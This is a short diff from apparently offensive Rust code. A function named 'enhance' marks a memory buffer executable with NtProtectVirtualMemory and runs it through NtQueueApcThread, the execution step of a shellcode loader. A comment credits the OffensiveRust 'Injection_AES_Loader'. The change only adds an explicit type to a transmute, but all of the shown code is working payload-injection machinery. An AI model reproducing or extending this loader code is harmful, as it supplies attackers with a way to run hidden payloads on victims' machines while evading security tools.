@@ -53,7 +53,7 @@ fn enhance(mut buf: Vec<u8>) {
             panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
         }
 
-        let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
+        let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute::<*mut c_void, unsafe extern "C" fn(*mut c_void, *mut c_void, *mut c_void)>(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
         // thanks to https://github.com/trickster0/OffensiveRust/blob/c7629a285e8128348d7d7239e25db858064ad0e2/Injection_AES_Loader/src/main.rs
         if !NT_SUCCESS(apc) {
             panic!("Error failed to call QueueUqerAPC: {}", apc);
